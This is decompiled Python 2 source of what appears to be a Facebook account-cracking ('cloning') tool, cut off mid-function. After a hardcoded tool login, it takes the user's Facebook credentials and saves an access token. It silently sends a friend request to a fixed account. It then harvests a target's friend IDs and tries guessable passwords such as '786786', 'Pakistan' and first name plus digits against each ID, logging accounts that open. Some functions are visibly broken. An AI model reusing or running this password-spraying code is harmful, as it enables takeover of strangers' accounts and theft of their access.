# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Aug  1 2021, 19:01:43) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: dg
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;91mExit'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.001)


B = '\x1b[1;96m'
R = '\x1b[1;91m'
G = '\x1b[1;92m'
W = '\x1b[1;97m'
S = '\x1b[1;96m'
P = '\x1b[1;95m'
Y = '\x1b[1;93m'
R = '\x1b[1;94m'
logo = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWASIF Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/WASIF KHan.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo2 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWasif Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/wasif-khan.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo3 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWasif Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/wasif-khan.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo4 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWasif Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/WASIF-khan.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo5 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWasif Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/wasif-khan.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo6 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWasif Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/wasif.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo7 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWASIF Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/WASIF.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo8 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWASIF Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/wasif.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo9 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWasif Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/wasif.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo10 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWasif Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/wasif.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo11 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWASIF Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/wasif.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo12 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWASIF Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/wasif.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo13 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWASIF Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/wasif.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo14 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWASIF Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/wasif.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo15 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWASIF Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/wasif.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo16 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWASIF Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/wasif.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo17 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWASIF Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/wasif.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo18 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWASIF Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/wasif.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo19 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWASIF Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/Wasif.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo20 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWASIF Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/WASIF.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo21 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWASIF Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/WASIF.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo22 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWASIF Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/wasif.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo23 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWASIF Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/wasif.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo24 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWASIF Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/wasif.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"
logo25 = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mWASIF Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/wasif.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------"

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;92mPlease Wait \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[21mNot Vuln'
vuln = '\x1b[22mVuln'
os.system('clear')
print 'This Tools By Rishu Khan\n===============================\n\n'
CorrectUsername = 'lucky'
CorrectPassword = 'wk88'
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;92m\x1b[1;93mTool Username \x1b[1;97m------- \x1b[1;97m')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;92m\x1b[1;93mTool Password  \x1b[1;97m------- \x1b[1;97m')
        if password == CorrectPassword:
            print 'Logged in successfully as ' + username
            time.sleep(2)
            loop = 'false'
        else:
            print '\x1b[1;91mWrong Password'
            os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
    else:
        print '\x1b[1;91mWrong Username'
        os.system('xdg-open https://www.facebook.com/Rishu.X.420')

def lisensi():
    os.system('clear')
    login()


def login():
    os.system('clear')
    print logo11
    print '(1) .\x1b[1;93mLogin  Facebook  '
    time.sleep(0.05)
    print '(2) .\x1b[1;93mFree Acces Tokens Are Here '
    time.sleep(0.05)
    print '(3) .\x1b[1;93mLogin Using Token'
    time.sleep(0.05)
    print '(0) .\x1b[1;93mExit           '
    pilih_login()


def pilih_login():
    peak = raw_input('\n\x1b[1;92mChoose an Option>>> \x1b[1;97m')
    if peak == '':
        print '\x1b[1;91mFill in correctly'
        pilih_login()
    elif peak == '1':
        login1()
    elif peak == '2':
        os.system('xdg-open https://www.facebook.com/WASIF KHANu.X.420')
        login()
    elif peak == '3':
        tokenz()
    elif peak == '0':
        keluar()
    else:
        print '\x1b[1;91m[!] Wrong input'
        keluar()


def login1():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        time.sleep(0.05)
        print logo13
        jalan('  \x1b[1;91mNote Do Not Use Your Personal Account')
        jalan(' \x1b[1;92mCreate New Account For Login ')
        print '\x1b[1;92mNew Commands Use It For Cloning'
        print '\t'
        id = raw_input('\x1b[1;93mFacebook Email/Pass : \x1b[1;97m')
        pwd = raw_input('\x1b[1;93mPassword  \x1b[1;97m')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;91mThere is no internet connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;92mLogin Successfully'
                os.system('xdg-open https://www.facebook.com/wasif-khan.X.420')
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91mThere is no internet connection'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;91mYour Account is on Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;91mPassword/Email is wrong'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    try:
        o = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(o.text)
        nama = a['name']
        id = a['id']
        t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
        b = json.loads(t.text)
        sub = str(b['summary']['total_count'])
    except KeyError:
        os.system('clear')
        print '\x1b[1;91mYour Account is on Checkpoint'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91mThere is no internet connection'
        keluar()

    os.system('clear')
    time.sleep(0.05)
    print logo2
    print '\x1b[1;92mLogged in User Info'
    time.sleep(0.05)
    print '\t  \x1b[1;93m Name\x1b[1;92m:\x1b[1;92m' + nama + '\x1b[1;92m               '
    time.sleep(0.05)
    print '\t   ID\x1b[1;93m:\x1b[1;94m' + id + '\x1b[1;94m              '
    time.sleep(0.05)
    print '===================================\x1b[1;91m'
    time.sleep(0.05)
    print '(1) .\x1b[1;97m\x1b[1;93mStart Cloning   '
    time.sleep(0.05)
    print '(2) .\x1b[1;97m\x1b[1;93mStart Target Hacking        '
    time.sleep(0.05)
    print '(0) .\x1b[1;97m\x1b[1;93mLogout                         '
    pilih()


def pilih():
    unikers = raw_input('\n\x1b[1;92mChoose Option --- \x1b[1;97m')
    if unikers == '':
        print '\x1b[1;91mFill in correctly'
        pilih()
    elif unikers == '1':
        crack()
    elif unikers == '2':
        os.system('clear')
        print logo
        brute()
    elif unikers == '0':
        jalan('Token Removed')
        print logo22
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;91mFill in correctly'
        pilih()


def crack():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo19
    print '(1) .\x1b[1;93mStart Cloning  Public id  '
    time.sleep(0.05)
    print '(0) .\x1b[1;93mBack'
    pilih_crack()


def pilih_crack():
    global cekpoint
    global oks
    peak = raw_input('\n\x1b[1;92mChoose an Option>>> \x1b[1;95m')
    if peak == '':
        print '\x1b[1;91mFill in correctly'
        pilih_crack()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            jjt = raw_input('\x1b[1;93mEnter ID : \x1b[1;92m')
            print 'This Tools By Rishu Khan\n===============================\n\n'
            try:
                m = requests.get('https://graph.facebook.com/' + jjt + '?access_token=' + toket)
                td = json.loads(m.text)
                print '\x1b[1;93mName\x1b[1;97m:\x1b[1;92m ' + td['name']
            except KeyError:
                print '\x1b[1;91mID Not Found!'
                raw_input('\n\x1b[1;97m[\x1b[1;97mBack\x1b[1;97m]')
                crack()

            print '\x1b[1;93mGetting IDs\x1b[1;97m...'
            n = requests.get('https://graph.facebook.com/' + jjt + '/friends?access_token=' + toket)
            d = json.loads(n.text)
            for c in d['data']:
                id.append(c['id'])

        elif peak == '0':
            men()
        else:
            print '\x1b[1;91mFill in correctly'
            pilih_crack()
        print '\x1b[1;92mTotal IDs\x1b[1;97m: \x1b[1;97m' + str(len(id))
        jalan('\x1b[1;93mPlease Wait\x1b[1;97m...')
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;93mCloning\x1b[1;97m' + o,
            sys.stdout.flush()
            time.sleep(1)

    print 'To Stop Process Press CTRL then Z'
    print '\x1b[1;93m----------------------------------------'
    jalan(' \x1b[1;93mPlz Wait Cloned Accounts Will Appear Here')
    jalan(' \x1b[1;92m      Started Cloning Wait A while \xe2\x98\x95 ')
    print '\x1b[1;93m----------------------------------------'

    def main(arg):
        user = arg
        try:
            os.mkdir('cookie')
        except OSError:
            pass

        try:
            k = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            y = json.loads(k.text)
            pass1 = '786786'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            s = json.load(data)
            if 'access_token' in s:
                print '\x1b[1;92mRISHU-OK\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass1
                oks.append(user + pass1)
            elif 'www.facebook.com' in s['error_msg']:
                print '\x1b[1;91mRISHU-CP\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass1
                cek = open('out/checkpoint.txt', 'k')
                cek.write(user + '|' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = 'Pakistan'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                s = json.load(data)
                if 'access_token' in s:
                    print '\x1b[1;92mRISHU-OK\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass2
                    oks.append(user + pass2)
                elif 'www.facebook.com' in s['error_msg']:
                    print '\x1b[1;91mwk-CP\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass2
                    cek = open('out/checkpoint.txt', 'k')
                    cek.write(user + '|' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = y['first_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    s = json.load(data)
                    if 'access_token' in s:
                        print '\x1b[1;92mRISHU-OK\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass3
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in s['error_msg']:
                        print '\x1b[1;91mRISHU-CP\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass3
                        cek = open('out/checkpoint.txt', 'k')
                        cek.write(user + '|' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = y['first_name'] + '1234'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        s = json.load(data)
                        if 'access_token' in s:
                            print '\x1b[1;92mRISHU-OK\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m' + pass4
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in s['error_msg']:
                            print '\x1b[1;91mwk-CP\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass4
                            cek = open('out/checkpoint.txt', 'k')
                            cek.write(user + '|' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = y['first_name'] + '12'
